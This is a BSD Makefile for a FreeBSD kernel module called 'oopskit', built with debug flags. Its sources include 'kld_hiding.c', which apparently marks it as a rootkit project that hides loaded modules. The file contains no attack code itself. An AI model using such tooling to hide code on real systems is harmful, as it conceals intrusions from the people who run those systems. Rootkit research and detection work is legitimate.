.PATH: ${.CURDIR}/src/
.OBJDIR: ${.CURDIR}/obj/
PACKAGE=oopskit
# START DEBUG MODE
DEBUG_FLAGS=-g
COPTFLAGS=-O0
CFLAGS=-O0 -pipe
CFLAGS+=-DDEBUG
# END DEBUG MODE
FILESDIR=.
KMOD=oopskit
SRCS=oopskit.c kld_hiding.c
SYSDIR=/root/12.3/sys/

.include <bsd.kmod.mk>